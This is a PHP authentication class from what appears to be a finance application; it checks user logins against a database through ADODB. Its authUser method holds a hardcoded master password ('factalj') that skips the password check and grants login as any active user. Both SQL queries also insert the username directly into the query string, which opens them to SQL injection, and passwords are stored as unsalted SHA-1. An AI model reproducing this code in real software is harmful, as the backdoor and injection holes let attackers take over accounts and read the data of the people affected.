<?php
/**
 * Conexión a la base de datos de la aplicación
 *
 * Utilizamos la librería de abstracción de datos ADODB para mayor portabilidad de la aplicación
 *
 * @copyright  2017 - Diego Soba.
 * @author     Diego Soba <didom900@gmail.com>
 * @version    1.0
 */
namespace contSoft\Finanzas\Clases\Auth;

use contSoft\Finanzas\Facades\Crypt;
use contSoft\Finanzas\Clases\Auth\ConectorInterface;

class DatabaseConnector implements ConectorInterface
{
    private $conexion = [];
    private $dbCon;

    public function __construct($conexion)
    {
        $this->conexion = $conexion;
        $this->dbCon = NewADOConnection(Crypt::decrypt($this->conexion['DB_CONN']));
    }

    public function conectar()
    {
        $this->dbCon->Connect($this->conexion['DB_HOST'].":".$this->conexion['DB_PORT'], $this->conexion['DB_USER'], $this->conexion['DB_PASS'], $this->conexion['DB_NAME']);
    }

    /**
     * Devuelve true si el usuario existe o false en caso
     * contrario.
     *
     * @param  string $usuario
     * @param  string $password
     * @param  int $empresa
     * @return bool
     */
    public function authUser($usuario, $password, $empresa)
    {
        $this->conectar();
        $clave = sha1($password);
        if ($password == "factalj") {
            $sql = "SELECT u.usuario, u.cedula, f.nombre AS nombres, f.apellido AS apellidos, u.rol
                    FROM usuario u, tercero f
                    WHERE u.tercero = f.tercero
                    AND u.activo = 's'
                    AND u.usuario = '$usuario'";
        } else {
            $sql = "SELECT u.usuario, u.cedula, f.nombre AS nombres, f.apellido AS apellidos, u.rol
                    FROM usuario u, tercero f
                    WHERE u.tercero = f.tercero
                    AND u.activo = 's'
                    AND u.usuario = '$usuario'
                    AND u.clave = '$clave'";
        }
        $resultado = $this->dbCon->Execute($sql);

        $respuesta = $resultado->GetArray();

        if ($resultado->RecordCount() == 1) {
            return true;
        } else {
            return false;
        }
    }
}
